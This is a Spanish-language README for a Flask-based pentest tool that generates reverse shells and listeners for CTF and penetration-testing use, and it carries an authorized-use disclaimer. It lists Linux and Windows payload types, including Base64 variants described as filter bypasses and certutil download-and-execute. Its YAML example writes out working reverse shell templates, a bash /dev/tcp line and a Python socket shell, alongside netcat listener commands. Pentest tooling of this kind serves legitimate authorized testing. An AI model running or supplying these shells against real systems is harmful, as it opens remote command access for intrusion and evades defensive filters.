<div align="center">

```
 ____  _______     _______ ____  ____  _____    _    __  __ 
|  _ \| ____\ \   / / ____|  _ \/ ___|| ____|  / \  |  \/  |
| |_) |  _|  \ \ / /|  _| | |_) \___ \|  _|   / _ \ | |\/| |
|  _ <| |___  \ V / | |___|  _ < ___) | |___ / ___ \| |  | |
|_| \_\_____|  \_/  |_____|_| \_\____/|_____/_/   \_\_|  |_|

  ____  _   _ ___ _     _       ____ _____ _   _ 
 / ___|| | | |_ _| |   | |     / ___| ____| \ | |
 \___ \| |_| || || |   | |    | |  _|  _| |  \| |
  ___) |  _  || || |___| |___ | |_| | |___| |\  |
 |____/|_| |_|___|_____|_____| \____|_____|_| \_|
```

# Pentest Shell Generator

**Generador dinámico de Reverse Shells y Listeners — Flask Edition**

[![Python](https://img.shields.io/badge/Python-3.8+-3776ab?style=flat-square&logo=python&logoColor=white)](https://python.org)
[![Flask](https://img.shields.io/badge/Flask-2.x-000000?style=flat-square&logo=flask)](https://flask.palletsprojects.com)
[![License](https://img.shields.io/badge/License-MIT-2e7d32?style=flat-square)]()
[![Purpose](https://img.shields.io/badge/Purpose-CTF%20%7C%20PenTest-8b0000?style=flat-square)]()
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-4a4a4a?style=flat-square)]()

> Una herramienta web ligera para auditores de seguridad y entusiastas de CTF. Genera reverse shells y configura listeners en tiempo real, detectando automáticamente las interfaces de red del sistema.

</div>

---

## Índice

- [Características](#-características)
- [Inicio rápido](#-inicio-rápido)
- [Estructura del proyecto](#-estructura-del-proyecto)
- [Payloads soportados](#-payloads-soportados)
- [Mejoras implementadas](#%EF%B8%8F-mejoras-implementadas)
- [Capturas](#-interfaz)
- [Configuración YAML](#-configuración-yaml)
- [Disclaimer](#%EF%B8%8F-disclaimer)

---

## ✨ Características

### Detección de red inteligente
- Identifica interfaces activas: `eth0`, `wlan0`, `tun0` (VPN), `lo`
- **Prioridad automática de VPN**: selecciona `tun0` primero para entornos HTB/THM
- Detecta IP pública vía API externa con sistema de **caché** para evitar latencia
- Filtra interfaces virtuales de Docker/VMware automáticamente

### Gestión de payloads
- Todos los payloads almacenados en `payloads.yml` — sin tocar el código
- Actualización y personalización sin reiniciar el servidor
- Reemplazo en **tiempo real** de IP y Puerto en la interfaz web

### Interfaz
- Dashboard responsive con generación instantánea
- Comandos listos para copiar con un click
- Selección dinámica de interfaz, puerto y tipo de payload

---

## 🚀 Inicio Rápido

### Instalación

```bash
# Clonar repositorio
git clone https://github.com/tuusuario/pentest-shell-generator.git
cd pentest-shell-generator

# Instalar dependencias
pip install flask psutil pyyaml requests

# O con requirements.txt
pip install -r requirements.txt
```

### Ejecutar

```bash
python3 app.py
```

```
 * Running on http://127.0.0.1:5000
 * Interface detected: tun0 → 10.10.14.5 (VPN Priority)
 * Payloads loaded: 18 Linux | 6 Windows | 8 Listeners
```

Abrir navegador: **http://127.0.0.1:5000**

### Uso básico

```
1. Seleccionar interfaz de red (tun0 para HTB/THM)
2. Definir puerto del listener
3. Seleccionar tipo de payload
4. Copiar el comando generado
5. En terminal separada: correr el listener sugerido
6. Ejecutar payload en objetivo
```

---

## 📂 Estructura del Proyecto

```
pentest-shell-generator/
│
├── app.py                  # Lógica Flask + detección de red
├── payloads.yml            # Base de datos de payloads (editar aquí)
├── requirements.txt        # Dependencias Python
│
├── templates/
│   └── index.html          # Dashboard principal (Jinja2)
│
└── static/
    ├── css/
    │   └── style.css       # Estilos
    └── js/
        └── main.js         # Actualización en tiempo real
```

---

## 💀 Payloads Soportados

### Linux

| Payload | Descripción |
|---|---|
| `bash_tcp` | Bash TCP reverse shell clásico |
| `bash_udp` | Bash sobre UDP |
| `python3_pty` | Python3 con PTY interactiva |
| `python3_b64` | Python3 en Base64 (evita filtros) |
| `php` | PHP one-liner |
| `perl` | Perl reverse shell |
| `ruby` | Ruby one-liner |
| `nc_mkfifo` | Netcat con mkfifo |
| `nc_e` | Netcat con `-e` (si está disponible) |
| `socat_tty` | Socat con TTY completamente interactiva |
| `awk` | AWK reverse shell |
| `lua` | Lua socket shell |

### Windows

| Payload | Descripción |
|---|---|
| `powershell_std` | PowerShell estándar |
| `powershell_b64` | PowerShell en Base64 (bypass de filtros) |
| `cmd_nc` | CMD usando nc.exe |
| `python_win` | Python para Windows |
| `mshta` | mshta.exe (bypass de restricciones) |
| `certutil` | Descarga y ejecución via certutil |

### Listeners

| Listener | Comando |
|---|---|
| `netcat` | `nc -lvnp <PORT>` |
| `rlwrap` | `rlwrap nc -lvnp <PORT>` (historial) |
| `socat` | `socat file:\`tty\`,raw,echo=0 tcp-listen:<PORT>` |
| `msfconsole` | `use exploit/multi/handler` |
| `pwncat` | `pwncat-cs -lp <PORT>` |
| `rustcat` | `rcat listen <PORT>` |

---

## 🛠️ Mejoras Implementadas

### Optimización de carga (Caching)
```python
# IP pública cacheada — evita request en cada carga
@lru_cache(maxsize=1)
def get_public_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=3).text
    except:
        return None
```

### Lógica de prioridad de red
```python
# Prioriza VPN sobre LAN sobre loopback
PRIORITY_ORDER = ['tun', 'tap', 'eth', 'ens', 'wlan', 'lo']

def get_best_interface():
    interfaces = psutil.net_if_addrs()
    for prefix in PRIORITY_ORDER:
        for iface in interfaces:
            if iface.startswith(prefix) and iface != 'lo':
                return iface
    return 'eth0'
```

### Seguridad en YAML
```python
# yaml.safe_load previene ejecución de código arbitrario
with open('payloads.yml', 'r') as f:
    payloads = yaml.safe_load(f)  # NO yaml.load()
```

### Payloads en Base64 automáticos
```python
# Generación automática de versión Base64 para cada payload bash/powershell
def encode_payload(cmd: str, shell: str = 'bash') -> str:
    if shell == 'powershell':
        encoded = base64.b64encode(cmd.encode('utf-16-le')).decode()
        return f'powershell -EncodedCommand {encoded}'
    else:
        encoded = base64.b64encode(cmd.encode()).decode()
        return f'echo {encoded} | base64 -d | bash'
```

---

## ⚙️ Configuración YAML

Agregar o modificar payloads en `payloads.yml` sin reiniciar el servidor:

```yaml
linux:
  - name: "bash_tcp"
    description: "Bash TCP Reverse Shell"
    command: "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"
    encode_b64: true

  - name: "python3_pty"
    description: "Python3 PTY Interactive Shell"
    command: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{IP}\",{PORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/bash\",\"-i\"])'"

windows:
  - name: "powershell_std"
    description: "PowerShell Reverse Shell"
    command: "$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});..."
    encode_b64: true

listeners:
  - name: "rlwrap"
    description: "Netcat con historial de comandos"
    command: "rlwrap nc -lvnp {PORT}"
```

---

## ⚠️ Disclaimer

> Esta herramienta ha sido creada exclusivamente para fines educativos y pruebas de penetración en entornos autorizados (CTF, laboratorios, auditorías con contrato). El uso contra sistemas sin consentimiento previo y por escrito es ilegal bajo las leyes de la mayoría de jurisdicciones. El autor no se hace responsable del uso indebido.

---

<div align="center">

**Desarrollado para la comunidad de ciberseguridad**

`Selecciona interfaz → Define puerto → Copia → Hackea (con permiso)`

</div>
